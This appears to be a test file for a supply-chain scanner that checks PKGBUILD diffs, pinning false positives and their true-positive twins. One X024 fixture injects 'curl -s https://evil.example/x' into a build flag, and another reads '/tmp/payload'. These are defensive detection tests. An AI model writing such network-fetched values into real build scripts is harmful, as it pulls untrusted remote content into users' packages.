"""Malicious false positives from the latest 2026-11-17 watcher alerts.

Each case pins the benign shape the rule misread and the true-positive twin
that must keep firing: a flag rewrite that filters a compiler variable, an
optional runtime suggestion that is dropped, and a project-owned release
bucket on a multi-tenant object store.
"""

from __future__ import annotations

import difflib
import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.buckets import classify_url  # noqa: E402
from trustsight.config import load_config, load_domains, load_rules  # noqa: E402
from trustsight.tokenizer import split_lines  # noqa: E402


_HEAD = """pkgname=p
pkgver=1.0
pkgrel=1
url="https://e.example"
arch=('x86_64')
license=('MIT')
source=("https://e.example/x.tar.gz")
sha256sums=('SHA')
"""


def _ids(diff, current_text=None, package_name="p"):
    with shipped_config():
        fact = scan_diff(
            diff, rules=load_rules(), config=load_config(),
            package_name=package_name, current_text=current_text,
        )
    return {e.rule_id for e in fact.score_breakdown}


def _diff(old: str, new: str) -> str:
    return "\n".join(difflib.unified_diff(
        split_lines(old), split_lines(new),
        fromfile="PKGBUILD", tofile="PKGBUILD", n=3,
    ))


def _ids_at(old: str, new: str) -> set[str]:
    return _ids(_diff(old, new), current_text=new)


_HEAD = _HEAD.replace("SHA", "0" * 64)

# --- X024: a flag rewrite is not an indirect sensitive assignment ---------

_FLAG_FILTER = """pkgname=p
pkgver=1.0
pkgrel=1
url="https://e.example"
arch=('x86_64')
license=('MIT')
source=("https://e.example/x.tar.gz")
sha256sums=('SKIP')

build() {
  export RUSTFLAGS="${RUSTFLAGS:-} --remap-path-prefix=$srcdir=/usr/src/debug/$pkgname"
  RUSTFLAGS=$(sed -E 's/(^| )-C ?debuginfo=[^ ]*//g' <<<"$RUSTFLAGS")
  cargo build --frozen --release
}
"""


def test_x024_a_filtered_compiler_flag_is_not_an_indirect_assignment():
    assert "X024" not in _ids_at(_HEAD, _FLAG_FILTER)


def test_x024_still_fires_when_the_value_comes_from_the_network():
    body = _FLAG_FILTER.replace(
        "RUSTFLAGS=$(sed -E 's/(^| )-C ?debuginfo=[^ ]*//g' <<<\"$RUSTFLAGS\")",
        "RUSTFLAGS=$(curl -s https://evil.example/x | sed s/a/b/)")
    assert "X024" in _ids_at(_HEAD, body)


def test_x024_still_fires_on_a_filter_over_another_file():
    body = _FLAG_FILTER.replace(
        "RUSTFLAGS=$(sed -E 's/(^| )-C ?debuginfo=[^ ]*//g' <<<\"$RUSTFLAGS\")",
        "RUSTFLAGS=$(sed -E 's/a/b/' /tmp/payload)")
    assert "X024" in _ids_at(_HEAD, body)


# --- C021: an optional runtime suggestion is not a dropped check ---------

_OLD_OPT = """pkgname=p
pkgver=1.0
pkgrel=1
url="https://e.example"
arch=('x86_64')
license=('MIT')
source=("https://e.example/x.tar.gz")
sha256sums=('SKIP')
optdepends=('vulkan-icd-loader: render with the GPU' 'mesa: screen sharing')

build() {
  make
}
"""

_NEW_OPT = _OLD_OPT.replace(
    "optdepends=('vulkan-icd-loader: render with the GPU' 'mesa: screen sharing')",
    "depends=('libglvnd')\noptdepends=('mesa: screen sharing through the portal')")

_CHECK_OLD = _OLD_OPT.replace(
    "optdepends=('vulkan-icd-loader: render with the GPU' 'mesa: screen sharing')",
    "checkdepends=('python-pytest' 'python-pytest-mock')")

_CHECK_NEW = _CHECK_OLD.replace("  make\n", "  make all\n").replace(
    "checkdepends=('python-pytest' 'python-pytest-mock')", "checkdepends=('python-pytest-mock')")


def test_c021_an_optional_suggestion_is_not_a_dropped_check():
    assert "C021" not in _ids_at(_OLD_OPT, _NEW_OPT)


def test_c021_still_fires_when_the_test_runner_is_removed():
    assert "C021" in _ids_at(_CHECK_OLD, _CHECK_NEW)


def test_c021_still_fires_when_checkdepends_is_emptied():
    body = _CHECK_OLD.replace(
        "checkdepends=('python-pytest' 'python-pytest-mock')\n", "").replace(
        "  make\n", "  make all\n")
    assert "C021" in _ids_at(_CHECK_OLD, body)


# --- SOURCE_BUCKET: the project's own bucket on a multi-tenant store -----

def test_the_overte_release_bucket_is_official():
    domains = load_domains()
    assert classify_url(
        "https://overte-public.fra1.digitaloceanspaces.com/build/overte/release/"
        "2026.10.1/Overte-2026.10.1-OpenGL-x86_64.AppImage", domains)[0] == "official"


def test_another_space_in_the_same_store_is_still_unknown():
    domains = load_domains()
    assert classify_url(
        "https://someone-else.fra1.digitaloceanspaces.com/x.AppImage", domains)[0] == "unknown"
